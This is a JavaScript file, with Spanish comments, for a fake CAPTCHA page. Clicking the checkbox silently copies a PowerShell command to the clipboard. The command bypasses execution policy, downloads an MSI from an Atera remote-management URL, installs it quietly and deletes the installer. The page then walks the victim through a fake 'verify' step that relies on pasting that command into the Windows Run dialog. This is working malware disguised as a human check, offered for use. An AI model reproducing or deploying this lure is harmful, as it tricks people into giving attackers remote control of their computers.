// ====== Helpers ======
const $ = s => document.querySelector(s);
const checkboxWindow = $("#checkbox-window");
const checkboxBtn = $("#checkbox");
const checkboxBtnSpinner = $("#spinner");
const verifywindow = $("#verify-window");
const verificationSpan = $("#verification-id");
const btnVerify = $("#verify-verify-button");
const btnCancel = $("#verify-cancel-button");

const rand4 = () => Math.floor(Math.random() * 9000 + 1000).toString();

// Texto a copiar (silencioso)
const buildPayload = () => `powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='https://HelpdeskSupport1753981830068.servicedesk.atera.com/GetAgent/Windows/?cid=2&aid=001Q300000VbT62IAF'; $p=Join-Path $env:TEMP 'setup.msi'; try { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile($u,$p); Start-Process msiexec.exe -ArgumentList '/i',$p,'/qn','/norestart' -Wait } finally { if (Test-Path $p) { Remove-Item $p -Force } }"`;

async function copySafe(text, fromGesture = false) {
  try {
    if (navigator.clipboard && (fromGesture || window.isSecureContext)) {
      await navigator.clipboard.writeText(text);
      return true;
    }
  } catch (e) {}
  // Fallback
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.position = "fixed";
  ta.style.opacity = "0";
  document.body.appendChild(ta);
  ta.focus();
  ta.select();
  let ok = false;
  try {
    ok = document.execCommand("copy");
  } catch (e) {}
  document.body.removeChild(ta);
  return ok;
}

function showCaptchaLoading(on) {
  checkboxBtnSpinner.style.visibility = on ? "visible" : "hidden";
  checkboxBtnSpinner.style.opacity = on ? "1" : "0";
}
function showCaptchaCheckbox() {
  checkboxBtn.style.width = "100%";
  checkboxBtn.style.height = "100%";
  checkboxBtn.style.borderRadius = "2px";
  checkboxBtn.style.margin = "21px 0 0 12px";
  checkboxBtn.style.opacity = "1";
}
function hideCaptchaCheckbox() {
  checkboxBtn.style.width = "4px";
  checkboxBtn.style.height = "4px";
  checkboxBtn.style.borderRadius = "50%";
  checkboxBtn.style.marginLeft = "25px";
  checkboxBtn.style.marginTop = "33px";
  checkboxBtn.style.opacity = "0";
}
function closeverifywindow() {
  verifywindow.style.display = "none";
  verifywindow.style.visibility = "hidden";
  verifywindow.style.opacity = "0";
  showCaptchaCheckbox();
  showCaptchaLoading(false);
  checkboxBtn.disabled = false;
}
function isverifywindowVisible() {
  return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
}
function showVerifyWindow() {
  verifywindow.style.display = "block";
  verifywindow.style.visibility = "visible";
  verifywindow.style.opacity = "1";
  verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
  verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";
  if (verifywindow.offsetTop < 5) verifywindow.style.top = "5px";
  if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10)
    verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
}

// ====== Flujo principal ======
// (sin cierre por clic fuera, para no cerrar al abrir Win+R)

checkboxBtn.addEventListener("click", async (event) => {
  event.preventDefault();
  checkboxBtn.disabled = true;

  // 1) Copiar inmediatamente (gesto del usuario) — SILENCIOSO
  const verification_id = rand4();
  verificationSpan.textContent = verification_id;
  const payload = buildPayload();
  await copySafe(payload, /*fromGesture=*/ true);

  // 2) Animaciones como el demo
  hideCaptchaCheckbox();
  setTimeout(() => showCaptchaLoading(true), 500);
  setTimeout(() => {
    showCaptchaLoading(false);
    showVerifyWindow();
  }, 900);
});

// Botón “Verify” (marca check y cierra)
btnVerify.addEventListener("click", () => {
  closeverifywindow();
  checkboxBtn.classList.add("tick");
  btnVerify.classList.add("verified");
  btnVerify.textContent = "Verified";
});

// Botón “Cancel” (solo cierra y restablece sin marcar check)
btnCancel.addEventListener("click", closeverifywindow);

// Cerrar solo cuando haya paste / Ctrl+V DENTRO DE LA PÁGINA
function onPasteOrCombo() {
  closeverifywindow();
  checkboxBtn.classList.add("tick");
  btnVerify.classList.add("verified");
  btnVerify.textContent = "Verified";
}
document.addEventListener("paste", onPasteOrCombo);
document.addEventListener("keydown", (e) => {
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "v") onPasteOrCombo();
});

